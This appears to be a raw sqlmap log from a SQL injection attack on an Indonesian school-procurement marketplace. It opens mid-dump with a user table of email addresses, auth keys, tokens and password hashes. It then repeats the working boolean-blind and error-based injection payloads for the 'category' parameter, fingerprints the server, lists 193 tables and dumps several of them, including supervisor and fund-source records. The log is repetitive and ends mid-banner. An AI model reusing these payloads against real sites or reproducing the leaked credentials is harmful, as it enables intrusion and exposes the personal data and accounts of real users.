| 1443 | NULL                 | loterkahang1@gmail.com                               | 1        | EAYcShOOL50vOQ0dR3tGsr9CYnRTdRyW | loterkahang1@gmail.com           | 1718066571 | 1629958737 | 1718066567 | LgjsfayF7k1cMxo7FyX4hmHt0pkRu1vD1U1cghzp | NULL         | $2y$13$GP28pe1NW20Xi1XMF8NdDeN0kb.24ET6IuXPCAq/qFoBDq6BiOeOO |
| 1444 | NULL                 | surip.maulana07@gmail.com                            | 1        | itnRhMdxYedpY6baueVIR0hkYQOJ9MIR | suripmaulana13@gmail.com         | 1714962080 | 1629958799 | 1714962077 | XR2WtaMb7lDdLMecVdwLmK8kKaxP4OZj9TWOLQRd | NULL         | $2y$13$u8/C0UQQ/NiYZmVYkgJRMOVGwGX2QuS19rD0B82G74Mx0tcFUD1mu |
| 1445 | NULL                 | pakngatmanta@gmail.com                               | 1        | ZePhdhldqgtR2D6Ifw7aWV8cJjUXU1sY | murniatimardirahayu@gmail.com    | 1631161116 | 1629958835 | 1631161116 | MIXQOxPhcbPPSGkYOOFPWA9Wok6yBRj2ApzBKEzn | NULL         | <blank>                                                      |
| 1446 | NULL                 | masnan584@yahoo.com                                  | 2        | tK7rplIGjuy5LXm5FF9MbAoX0kecBd4L | sahlani158@yahoo.com             | 1642004080 | 1629958849 | 1642004079 | WdrgJIk3z0I4nwzvvfifWxH0yPU6cfiNstkaEvo2 | NULL         | <blank>                                                      |
| 1447 | NULL                 | chdwimurniati@gmail.com                              | 1        | 54cyb0tqC7KnNIx2I9NM0NaOADDTgMCr | chdwimurniati@gmail.com          | 1630468855 | 1629958931 | 1630468854 | tPNQkqtghQRH2rgGisKhEJvvZuWwMmNnRPipr8bd | NULL         | <blank>                                                      |
| 1448 | NULL                 | erikadiin027@gmail.com                               | 2        | GqUbGaOSFV9UOYIo6EpgX7stgFTOm2kc | erikadiin0271@gmail.com          | 1686105132 | 1629958996 | 1686105130 | 6A1gvcaMXc1CXYB2YhxL0n6akXFTONz1RcYKxbS0 | NULL         | $2y$13$4hIIleYZlYvh1yx0SK4idu6r9vnofyDQIm2c6VGKm2SNVUSDWKq7a |
| 1449 | NULL                 | nurwatiagg@gmail.com                                 | 2        | u5c5Sj1wOPr3uhlWtR9z0mwdruOm6FDN | nurwatiagg@gmail.com             | 1666096999 | 1629959008 | 1666096998 | Jgv4ZbpAieNagu2ctxHIORO81zqBNl5B8jmBYN7B | NULL         | $2y$13$c2lFLG436bUW0eqzIklh6eZrjeDmHZeRZKWtypICfXozglv4u/k22 |
| 1450 | NULL                 | jmdgldk@gmail.com                                    | 1        | ROPqW7yZAK7oaBmmzZ8Xx31V0GSGC6OK | jmdgldk@gmail.com                | 1630639386 | 1629959048 | 1630639385 | yiv49KHWvveD1eRlp2Qf9zLColIOlLFS8RZZvAWg | NULL         | <blank>                                                      |
| 1451 | NULL                 | emisatu27@gmail.com                                  | 2        | 6GK6Q9EvwI5XILQGitgYblEzgr60lIKK | emisatu27@gmail.com              | 1629968674 | 1629959050 | 1629968674 | ojPfV4dCjNCb316REhjZIJDUwnBVkPDiLdJmhIT9 | NULL         | <blank>                                                      |
| 1452 | NULL                 | abdurahmancantung@gmail.com                          | 1        | TKkC6nlPOFzdtRDxVHqwCds3kTkuQYLm | abdurahmancantung@gmail.com      | 1637829733 | 1629959169 | 1637829733 | UCdTzGq4EPDz9eKDeGveuAIoEQ2w8TBi9r7yFLfl | NULL         | <blank>                                                      |
| 1453 | NULL                 | Ahyar971@gmail.com                                   | 1        | xyoKk25MUCCaFnj7icB1rjyMRcC0igcf | ahyar20201@gmail.com             | 1630118543 | 1629959202 | 1630118542 | yaYbJdOcHgurThpNldvzIebTYF1tAzRh1GoXUKI1 | NULL         | <blank>                                                      |
| 1454 | NULL                 | firdaus_sar@yahoo.co.id                              | 2        | 5gXzUq0bKfIl8kYxl5IXHHtif2SDrksI | firdaus.sar01@gmail.com          | 1635904315 | 1629959232 | 1635904314 | hQ2kEEipyThXu3kHvfwooDJj5n7xuaSlEnjZBHEW | NULL         | <blank>                                                      |
| 1455 | NULL                 | lu2diana@yahoo.com                                   | 1        | fOqX7aNrjOrJTvtfNJtQl8rUqZJDD1Xo | ipon.nurmala@gmail.com           | 1631687133 | 1629959312 | 1631687133 | 4L172a33EWRnmNc276qm1uvSeuZtclpsJQHWDH6c | NULL         | <blank>                                                      |
| 1456 | NULL                 | arifindgmasiga76@gmail.com                           | 1        | xmI77pw9BL4VWBY4SM3h82a8uSchj9cw | arifindgmasiga76@gmail.com       | 1643786010 | 1629959320 | 1643786010 | betyw4yY5NxyWxdS1GIo8YhQ6v1Ei1Wvj2XFDn43 | NULL         | <blank>                                                      |
| 1457 | NULL                 | eniwae4581@gmail.com                                 | 1        | tTVtgjJmov99bPV6IlwseojBbmEUEG0w | eniwae4581@gmail.com             | 1629959322 | 1629959321 | 1629959321 | x0TH9nECpue3GeEWPfU2UOzDPhUn3rEU24rUyHtD | NULL         | <blank>                                                      |
| 1458 | NULL                 | ubang70@gmail.com                                    | 1        | koj8vimhC3xS58nwq15Q9gDHKgcDg0Ss | ubang70@gmail.com                | 1718113066 | 1629959375 | 1718113065 | 8tFjmx5KJOsYwexezcaZGTpQkM6fAWy7DmYdHV7I | NULL         | $2y$13$s9Ed.F9XyPmq04NTlpxG4.8H2eGdfMyD25VQeYmnPlhPw3JF37tha |
| 1459 | NULL                 | sriwinarsih066@gmail.com                             | 2        | DmBuA6pIXCkpykNbJRv1PS9vLMq5n0qj | sriwinarsih066@gmail.com         | 1642687376 | 1629959384 | 1642687375 | 81E5JayJtZRoLQDXfFnBOd7FUl6aYI2YGqQfQ08h | NULL         | <blank>                                                      |
| 1460 | NULL                 | agustinadwiprasetyorini@gmail.com                    | 1        | S96fdxJ7UwRJz3Z5AS1IhCQxiRDDFOtp | agustinadwiprasetyorini@gmail.co | 1629959456 | 1629959452 | 1629959452 | 9qIWtEp7yLhEMlYjKum23fUdYV1ukLqA4wy0XJXo | NULL         | <blank>                                                      |
| 1461 | NULL                 | wiyasihwiyasih@gmail.com                             | 1        | MtwT0vmN7PnHUwuKzS9U2TkPioeMGUIz | wiyasihwiyasih@gmail.com         | 1632448343 | 1629959454 | 1632448343 | GNAVBXJr08nrN7A8Fn7DagUihZ06aVTS9mlEvnkh | NULL         | <blank>                                                      |
| 1462 | NULL                 | suparnopr@yahoo.com                                  | 1        | 0oVfuSU2qZuE8FUAtNmekdyPNC5ymztB | muflihatul116@gmail.com          | 1629959528 | 1629959524 | 1629959524 | LXmA1SCPq5d6N8THahnqJInpT61GVqaGBWxpUEhT | NULL         | <blank>                                                      |
| 1463 | NULL                 | hisbullah66@gmail.com                                | 2        | IuGc9pHeQwqV3uylr2cVGLgkgNbPBYIT | hisbullahemis@gmail.com          | 1670041130 | 1629959534 | 1670041127 | phSLyh5HXEH2FOyZn4sCto3bmAuu9MDqCeixO58w | NULL         | $2y$13$n3odNQMXVsvFF8wdfjCpxOuxE4Q9HCvcfIZWZvDjuKfAQMOC8ceou |
| 1464 | NULL                 | sribasuki_ngawendua@yahoo.com                        | 1        | HoNNABZ1ZgyaTd77UXAkVOllOVSa7nLj | sribasukingawendua@gmail.com     | 1666556023 | 1629959640 | 1666556022 | 7YeLTWmSKtz83WkvF4xeJd9KcJvrpkXCdDQ6TJvp | NULL         | $2y$13$uQZi.9oMGlcE.iA.NOUZwOWuYo30QYymV2xGYkzrcUKhvFNKMkNIC |
| 1465 | NULL                 | muridusdn2bd@gmail.com                               | 2        | jL5yxPwPI6RNVOqATi8dl2FcqTllIMdi | muridusdn2bd@gmail.com           | 1638580879 | 1629959660 | 1638580878 | pRgPgCYTNcRK36odveRnzhrQBSEgzlviu89FwryR | NULL         | <blank>                                                      |
| 1466 | NULL                 | sriwahyuni.ptw1@gmail.com                            | 1        | xQV4qreNe67NL5szxtx7WRjGhKg71D5D | sriwahyuni.ptw1@gmail.com        | 1632448254 | 1629959668 | 1632448253 | 4JARxgm9Ntf8WAWJSTNrRs30GK350WQ2LH6XxyKm | NULL         | <blank>                                                      |
| 1467 | NULL                 | rusdiamali17@gmail.com                               | 2        | ZJjrkxVMUC8UJFKSzg5gjvPs7dROrrrh | sahbudin.rd@gmail.com            | 1655253786 | 1629959685 | 1655253785 | FY4WfWRZJt7g7jSWRx1pDcL3nXNaUZDzaz1stmHt | NULL         | <blank>                                                      |
| 1468 | NULL                 | ssujiharno66@gmail.com                               | 1        | 1XuKeuwoDWoQxqyifXAZCkeQZKEG4Z7D | ssujiharno66@gmail.com           | 1717572054 | 1629959834 | 1717559823 | dHN1eq5sLx0M8oHphOZ0GcE8eekCt8vf3eP0cYAw | NULL         | $2y$13$1OzNgCSIvpeSGIBfvPxfv.BrLX95LFJC4e7XYZKGvnJHL4artjbYC |
| 1469 | NULL                 | eni.triwinarsih45@gmail.com                          | 1        | w8bBE8y0bg14uYbBveS6BfDZHs60LGcu | eni.triwinarsih45@gmail.com      | 1629959842 | 1629959839 | 1629959839 | JIoOYxD46RHkCts095aqM9scUuRSPRfXFckxHkWP | NULL         | <blank>                                                      |
| 1470 | NULL                 | saidi.creank78@gmail.com                             | 2        | 2Xwf6gQHKaxQ6IXGwtbDi2Lb83MXdeI0 | saidi.creank78@gmail.com         | 1661850890 | 1629959924 | 1661850889 | CY8W9GPLjxCB91KGrjK5211HCO1b0THhC45AtkCH | NULL         | <blank>                                                      |
| 1471 | NULL                 | sudiyartomaksi@yahoo.com                             | 2        | MqrBtg99j3ey1tKj45YNoL8l1WQG6ldu | Sudiyartomaksi@gmail.com         | 1635996168 | 1629960014 | 1635996167 | tNodCKQRxB7cJyMgTOHM2fc5I1iwSoR80eWe1eaO | NULL         | <blank>                                                      |
| 1472 | NULL                 | yuonobudiwidodo@yahoo.co.id                          | 1        | 7elFGh1utGNgx49hfRMT565J4UPl0qZB | yuonowidodo@gmail.com            | 1639530982 | 1629960023 | 1639530982 | r6CJTjM0icTOTSQRlatiM6excN1ZHMidQxueiV3l | NULL         | <blank>                                                      |
| 1473 | NULL                 | 11junaedi12@gmail.com                                | 1        | YQKkq45ovhFDZgMgiXw1bk3TgNZBgYZT | 11junaedi12@gmail.com            | 1629966160 | 1629960027 | 1629966160 | b97FZsa6iyYCS1x8x1bTW9sIKkvzXkCIyywqUQ7N | NULL         | <blank>                                                      |
| 1474 | NULL                 | henynurhayani4@gmail.com                             | 2        | LTStiDgTo7Cjq7Ke6K7QFrQj2bDyuMyF | henynurhayani4@gmail.com         | 1658556211 | 1629960096 | 1658556210 | dn5HHcAvRsuy66TI0rNoSKWltW3Z1S1jUZ4o20tT | NULL         | <blank>                                                      |
| 1476 | NULL                 | caterina.kaunang@gmail.com                           | 2        | 8S1TPH3QDSJ7FD3NSNmqtFhRGXevGgpc | caterina.kaunang2020@hotmail.com | 1630029283 | 1629960132 | 1630029281 | izpe6LcdZbCP08dM1FRtkMbHp6BpQp0XUkGL5AXt | NULL         | <blank>                                                      |
| 1477 | NULL                 | badjeberramlah@yahoo.co.id                           | 1        | vS2vvUKUGlc5fqwsvjPovrvq3QUqjIQx | ramlahdonggala@gmail.com         | 1722043645 | 1629960146 | 1722043643 | vjhpyozU8ylUAeiJ5U7Wu7EXLgaJfogEq9t7QYgn | NULL         | $2y$13$UfwVX02CHqYiWiydMHf3veTl8r09XHBh.PgIr5wiMl.BrxM6ejyEq |
| 1478 | NULL                 | sdnnangela1948@gmail.com                             | 1        | 4w2GZv3D6cs2vMBZvCK1wBwwDpmFh8D0 | habibahsopiah3@gmail.com         | 1635922920 | 1629960153 | 1635922919 | LX4RwEQTc6PoBV8iqjIBaX98C2VAprbb9DsFmnen | NULL         | <blank>                                                      |
| 1479 | NULL                 | suratniarsha47@gmail.com                             | 1        | RKPJdGa0Z1d0abshqvHVRXkskUmsMho9 | suratniarsha47@gmail.com         | 1632448049 | 1629960260 | 1632448049 | kR3Yvvx16Lqpt0YxKz371YiPxqbB1z18Lbzv9s84 | NULL         | <blank>                                                      |
| 1480 | NULL                 | firohsaja24@gmail.com                                | 1        | pb0h0CfoSFFOT6dgcSxhtqgACJnYncjS | djambolle@gmail.com              | 1630982467 | 1629960400 | 1630982467 | dLNgAfeNgH2noE8bHdzEK8UkxG3mYDkWtHy9F3k6 | NULL         | <blank>                                                      |
+------+----------------------+------------------------------------------------------+----------+----------------------------------+----------------------------------+------------+------------+------------+------------------------------------------+--------------+--------------------------------------------------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: absahid
[193 tables]
+----------------------------------+
| buku                             |
| duplicat_product                 |
| duplicat_product_copy            |
| duplicat_product_copy2           |
| duplicat_product_fix             |
| duplicat_product_help            |
| ip_cart_history                  |
| ipr_activity                     |
| ipr_addons                       |
| ipr_agregasi_fail                |
| ipr_agregasi_fail2               |
| ipr_anggaran                     |
| ipr_anggaran_kegiatan            |
| ipr_anggaran_produk              |
| ipr_anggaran_sumber_dana         |
| ipr_api_djp                      |
| ipr_article                      |
| ipr_article_attachment           |
| ipr_article_category             |
| ipr_assign_product_cat           |
| ipr_assign_product_cat_bela      |
| ipr_auto_number                  |
| ipr_bank_mp                      |
| ipr_bank_mp_mapping              |
| ipr_bank_store                   |
| ipr_bank_user                    |
| ipr_berita                       |
| ipr_c_compare                    |
| ipr_c_compare_item               |
| ipr_c_compare_item_detail        |
| ipr_c_compare_store              |
| ipr_cart                         |
| ipr_cart_chat                    |
| ipr_cart_compare                 |
| ipr_cart_compare_item            |
| ipr_cart_compare_item_detail     |
| ipr_cart_item                    |
| ipr_cart_item_import             |
| ipr_cart_nego_item               |
| ipr_cart_nego_item_msg           |
| ipr_cart_new_demo                |
| ipr_categories_test              |
| ipr_checksums                    |
| ipr_classification               |
| ipr_code_dikbud                  |
| ipr_compare                      |
| ipr_compare_product              |
| ipr_complain                     |
| ipr_complain_detail              |
| ipr_complain_file                |
| ipr_complain_product             |
| ipr_cost_jaladara                |
| ipr_courier_partner              |
| ipr_courier_person               |
| ipr_courier_product              |
| ipr_districts                    |
| ipr_districts_pengawas           |
| ipr_ebilling                     |
| ipr_educations_pengawas          |
| ipr_etalase                      |
| ipr_featured_product             |
| ipr_featured_product_assign      |
| ipr_file_storage_item            |
| ipr_funds_pengawas               |
| ipr_hot_product                  |
| ipr_i18n_message                 |
| ipr_i18n_source_message          |
| ipr_jne                          |
| ipr_key_storage_item             |
| ipr_kloning_activity             |
| ipr_login                        |
| ipr_master_bank                  |
| ipr_master_json                  |
| ipr_master_kegiatan              |
| ipr_master_kekayaan              |
| ipr_master_kekayaan_cat          |
| ipr_master_mapping_code          |
| ipr_master_mapping_districts     |
| ipr_master_status                |
| ipr_master_status22              |
| ipr_master_status_copy           |
| ipr_master_status_copy2          |
| ipr_nego                         |
| ipr_nego_product                 |
| ipr_no_faktur                    |
| ipr_non_text_book_school_levels  |
| ipr_notification                 |
| ipr_npwp_dinas                   |
| ipr_option                       |
| ipr_option_value                 |
| ipr_order                        |
| ipr_order_address                |
| ipr_order_bast                   |
| ipr_order_compare                |
| ipr_order_compare_item           |
| ipr_order_compare_item_detail    |
| ipr_order_history                |
| ipr_order_nego_compare           |
| ipr_order_nego_item              |
| ipr_order_payment                |
| ipr_order_product                |
| ipr_order_store                  |
| ipr_page                         |
| ipr_payment_setting              |
| ipr_payment_to_store             |
| ipr_pengawas                     |
| ipr_ppn_tag                      |
| ipr_product                      |
| ipr_product_bundle               |
| ipr_product_bundle_import_result |
| ipr_product_category             |
| ipr_product_category_bela        |
| ipr_product_category_old         |
| ipr_product_districts            |
| ipr_product_etalase              |
| ipr_product_file                 |
| ipr_product_import               |
| ipr_product_import_result        |
| ipr_product_import_tbm           |
| ipr_product_price                |
| ipr_product_rating               |
| ipr_product_shipping             |
| ipr_product_sku                  |
| ipr_product_sku_2021             |
| ipr_product_sku_export           |
| ipr_product_spesification        |
| ipr_product_stock                |
| ipr_product_store                |
| ipr_product_tag                  |
| ipr_province                     |
| ipr_province_pengawas            |
| ipr_publishers                   |
| ipr_puskurbuk                    |
| ipr_quick_search                 |
| ipr_quick_search_product         |
| ipr_rbac_auth_assignment         |
| ipr_rbac_auth_item               |
| ipr_rbac_auth_item_child         |
| ipr_rbac_auth_rule               |
| ipr_request_efaktur              |
| ipr_roles_pengawas               |
| ipr_sekolah                      |
| ipr_sekolah_copy                 |
| ipr_sertel_pajak                 |
| ipr_setting_main                 |
| ipr_shipping_setting             |
| ipr_specs                        |
| ipr_specs_value                  |
| ipr_store                        |
| ipr_store_courier_partner        |
| ipr_store_detail                 |
| ipr_store_fav                    |
| ipr_store_file                   |
| ipr_store_owner                  |
| ipr_store_rating                 |
| ipr_store_user                   |
| ipr_store_wiljual                |
| ipr_subdistrict                  |
| ipr_sumber_dana                  |
| ipr_sumber_dana_sekolah          |
| ipr_system_db_migration          |
| ipr_system_log                   |
| ipr_system_rbac_migration        |
| ipr_tags                         |
| ipr_text_book_school_classes     |
| ipr_text_book_school_levels      |
| ipr_text_book_subjects           |
| ipr_timeline_event               |
| ipr_tmplogin                     |
| ipr_top_categories               |
| ipr_top_categories_header        |
| ipr_user                         |
| ipr_user_address                 |
| ipr_user_profile                 |
| ipr_user_sekolah                 |
| ipr_user_token                   |
| ipr_village                      |
| ipr_widget_carousel              |
| ipr_widget_carousel_item         |
| ipr_widget_menu                  |
| ipr_widget_text                  |
| ipr_wishlist                     |
| ipr_wishlist_product             |
| ipr_zona                         |
| ipr_zona_districts               |
| konfirm_oldist                   |
| matrik_ongkir                    |
| matrik_ongkir_150922             |
| matrik_ongkir_awal               |
| matrik_ongkir_lama               |
| matriks_depo                     |
| tracking_order                   |
| type_ongkir                      |
+----------------------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: absahid
Table: ipr_pengawas
[1 entry]
+---------+-----------+--------------------+-------------+---------------------------------+--------------------+--------------------+--------------+--------------+--------------------+
| user_id | status_id | id_pengawas_dikbud | nik         | email                           | name               | agency_name        | label_status | phone_number | position_name      |
+---------+-----------+--------------------+-------------+---------------------------------+--------------------+--------------------+--------------+--------------+--------------------+
| 19321   | 1         | 531                | 55555555555 | pengawaspusatall@mailinator.com | Pengawas Pusat All | Pengawas Pusat All | Aktif        | 888888888    | Pengawas Pusat All |
+---------+-----------+--------------------+-------------+---------------------------------+--------------------+--------------------+--------------+--------------+--------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: absahid
Table: ipr_bank_user
[0 entries]
+----+---------+---------+-----------+--------+----------+------------+------------+
| id | bank_id | user_id | status_id | name   | number   | created_at | updated_at |
+----+---------+---------+-----------+--------+----------+------------+------------+
+----+---------+---------+-----------+--------+----------+------------+------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: absahid
Table: ipr_funds_pengawas
[17 entries]
+----+---------+----------------+-----------------------------------------------------------------------------------------------------------------------------------------------+
| id | user_id | kd_sumber_dana | fund_source_name                                                                                                                              |
+----+---------+----------------+-----------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | 19321   | SMKP0608       | Bantuan Pemerintah Pengembangan SMK Pusat Keunggulan (Centre of Excellence) Pengembangan Lanjutan SMK Pusat Keunggulan (Centre of Excellence) |
| 2  | 19321   | SMKR0608       | Bantuan Pemerintah Retrofit Peralatan Pendidikan pada Sektor Prioritas                                                                        |
| 3  | 19321   | SMKH0608       | Bantuan Pemerintah Pengembangan SMK Pusat Keunggulan (Centre of Excellence) Prioritas Sektor Hospitality                                      |
| 4  | 19321   | BOPKTNGN       | BOP PAUD KABUPATEN KATINGAN 2021                                                                                                              |
| 5  | 19321   | SMKC0608       | Bantuan Pemerintah Pengembangan SMK Pusat Keunggulan (Centre of Excellence) Prioritas Sektor Calon Pekerja Migran Potensial                   |
| 6  | 19321   | SMK1507        | SMK yang Dikembangkan Menjadi Pusat Keunggulan (Center Of Excellence) Prioritas Sektor Lainnya                                                |
| 7  | 19321   | BOPKTWRNGN     | BOP KESETARAAN KOTAWARINGIN TIMUR                                                                                                             |
| 8  | 19321   | SMKL0608       | Bantuan Pemerintah Pengembangan SMK Pusat Keunggulan (Centre of Excellence) Prioritas Kerjasama Luar Negeri                                   |
| 9  | 19321   | MANDIRI2021    | Pendanaan Mandiri                                                                                                                             |
| 10 | 19321   | BOPBLKMB       | BOP KESETARAAN BULUKUMBA                                                                                                                      |
| 11 | 19321   | BOPKESPAUD     | BOP Kesetaraan                                                                                                                                |
| 12 | 19321   | SILBOS2020     | Silpa BOS Reguler 2020                                                                                                                        |
| 13 | 19321   | SMK1607        | Bantuan Pemerintah Pengembangan SMK Pusat Keunggulan (Centre of Excellence) Prioritas Sektor Pemesinan dan Konstruksi                         |
| 14 | 19321   | BAPKTB2021     | Bantuan Alat Pendidikan Keterampilan Tata Boga 2021                                                                                           |
| 15 | 19321   | SILKIN2020     | Silpa BOS Kinerja 2020                                                                                                                        |
| 17 | 19321   | SILAF2020      | Silpa BOS Afirmasi 2020                                                                                                                       |
| 19 | 19321   | BOSREG2021     | BOS Reguler 2021                                                                                                                              |
+----+---------+----------------+-----------------------------------------------------------------------------------------------------------------------------------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
Database: absahid
Table: buku
[0 entries]
+------+-------+
| no   | agama |
+------+-------+
+------+-------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: active fingerprint: MySQL >= 8.0.0
               comment injection fingerprint: MySQL 8.0.25
               banner parsing fingerprint: MySQL 8.0.25
banner: '8.0.25-commercial'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: category=23 AND GTID_SUBSET(CONCAT(0x717a7a7871,(SELECT (ELT(8713=8713,1))),0x7162627a71),8713)
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 8
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=23 AND 6931=6931

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
